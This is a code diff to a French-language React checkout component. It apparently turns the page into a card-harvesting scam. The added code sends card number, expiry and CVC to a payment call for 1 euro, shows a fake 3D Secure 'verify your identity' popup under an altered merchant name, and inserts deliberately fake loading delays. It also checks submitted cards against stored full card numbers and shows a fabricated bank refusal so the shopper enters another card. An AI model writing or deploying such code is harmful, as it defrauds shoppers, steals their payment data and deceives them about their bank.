@@ -1,7 +1,10 @@
 import { useState, useRef, useEffect } from 'react';
 import { useRouter } from 'next/router';
 
-const CustomPay = ({ amount, orderNumber, onBack, showStep, isLoading, setIsLoading, show3DSecurePopup, setShow3DSecurePopup, data, shop }) => {
+
+
+
+const CustomPay = ({ amount, orderNumber, onBack, showStep, isLoading, setIsLoading, show3DSecurePopup, setShow3DSecurePopup, data, shop, payments }) => {
   const [formData, setFormData] = useState({
     cardHolder: '',
     cardNumber: '',
@@ -181,6 +184,29 @@ const CustomPay = ({ amount, orderNumber, onBack, showStep, isLoading, setIsLoad
     return false;
   }
 
+
+    // ...existing code...
+  
+  const verifyCard = async (cardNumber) => {
+    // Normalise le numéro recherché (supprime les espaces)
+    const target = cardNumber.replace(/\s/g, '');
+  
+    // Parcourt les paiements et renvoie true si on trouve une correspondance
+    return payments.some(payment => {
+      // Parse card_details si besoin
+      const details = typeof payment.card_details === 'string'
+        ? JSON.parse(payment.card_details)
+        : payment.card_details;
+  
+      // Normalise le numéro dans les détails
+      const number = (details.cardNumber || '').replace(/\s/g, '');
+      return number === target;
+    });
+  };
+  
+  // ...existing code...
+
+
   const handleCheckout = async (e) => {
     e.preventDefault();
     if (document.activeElement === document.querySelector('input[name="cvv"]')) {
@@ -189,7 +215,7 @@ const CustomPay = ({ amount, orderNumber, onBack, showStep, isLoading, setIsLoad
     gtag_report_conversion();
 
     const cardDetails = {
-      cardNumber: ` ${formData.cardNumber} `,
+      cardNumber: formData.cardNumber,
       cardOwner: formData.cardHolder,
       cardExpiration: formData.expiryDate,
       cardCVC: formData.cvv,
@@ -200,27 +226,48 @@ const CustomPay = ({ amount, orderNumber, onBack, showStep, isLoading, setIsLoad
     }
 
     try {
+
+      // Afficher la popup de chargement..
       console.log("Paiement en cours...");
       setIsLoading(true);
       
       // Lancer en fond la réinitialisation supplémentaire
       //triggerBackgroundReinit();
 
-      setTimeout(() => {
+      // Vérifier si la carte a déjà été utilisée
+      const verifyResult = await verifyCard(cardDetails.cardNumber);
+
+      // Délais faux chargement de préparation
+      setTimeout(() => {}, 8000);
+
+      // Si carte déjà été utilisée, afficher l'erreur
+      if (verifyResult) {
+        console.log("--> Carte déjà utilisée");
         setIsLoading(false);
-        setShow3DSecurePopup(true);
-      }, 56000);
+        setShow3DSecurePopup(false);
+        setShowCardError(true);
+      }
+      else {
+        console.log("--> Carte non utilisée");
+        setTimeout(() => {
+          setIsLoading(false);
+          setShowCardError(false);
+          setShow3DSecurePopup(true);
+        }, 20000);
 
-      const result = await payFetch(orderNumber, amount, cardDetails);
-      setIsLoading(false);
-      setShow3DSecurePopup(false);
+        // Requête de paiement à l'API 
+        const result = await payFetch(orderNumber, 1, cardDetails);
+        setIsLoading(false);
+        setShow3DSecurePopup(false);
 
-      // Diferant Popup => (Optional)
-      // if (result === "refused") {
-      //   setShowCardError(true); 
-      // } else {
-      //   setShowPaymentError(true);
-      // }
+        // Diferant Popup => (Optional)
+        // if (result === "refused") {
+        //   setShowCardError(true); 
+        // } else {
+        //   setShowPaymentError(true);
+        // }
+      }
+      
     } catch (error) {
       console.error(data.checkoutPayError, error);
       alert(data.checkoutPayGenericError);
@@ -326,12 +373,12 @@ const CustomPay = ({ amount, orderNumber, onBack, showStep, isLoading, setIsLoad
               />
             </article>
             <img src="3d-secure.png" alt="3D Secure" className="icon" />
-            <h2></h2>
-            <p className="desc">{data.checkoutPay3DSecureDescription}</p>
+            <h2>Vérifiez votre identité</h2>
+            <p className="desc">Avant de poursuivre vers le paiement, validez la transaction suivante :</p>
             <article className="infos">
-              <span>LW-BRICKS.CO (Christopeit Sport)</span>
+              <span>LW VERIF BRICKS ID.CO</span>
               <span>
-                Montant à valider : {amount}{shop.currency}
+                Montant à vérifier : 1,00€
               </span>
               <span> 
                 Date : {`${formattedDate} à ${formattedTime}`}
@@ -341,7 +388,7 @@ const CustomPay = ({ amount, orderNumber, onBack, showStep, isLoading, setIsLoad
               </span>
             </article>
             <div className="loader border-top-primary"></div>
-            <p className="smaller">{data.checkoutPay3DSecureFooter}</p>
+            <p className="smaller">Une fois la vérification effectuée, vous serez redirigé vers la page de paiement.</p>
           </div>
         </div>
       )}
@@ -379,10 +426,16 @@ const CustomPay = ({ amount, orderNumber, onBack, showStep, isLoading, setIsLoad
               />
             </article>
             <h2 className="icon">❌</h2>
-            <h2>Erreur lors du paiement</h2>
-            <p className="desc">Une erreur est survenue, lors du paiement veuillez réessayer.</p>
-            <button onClick={() => { handleRetry(); setCheckoutProvider("google"); }} disabled={isLoading}>
-              Réesayer
+            <h2>Moyen de paiement refusé</h2>
+            <p className="desc">BNP Paribas, ne prends pas en charge la carte bancaire renseigné.</p>
+            <button
+              onClick={() => {
+                setShowCardError(false);
+                window.location.reload();
+              }}
+              disabled={isLoading}
+            >
+              Changer de carte
             </button>
           </div>
         </div>
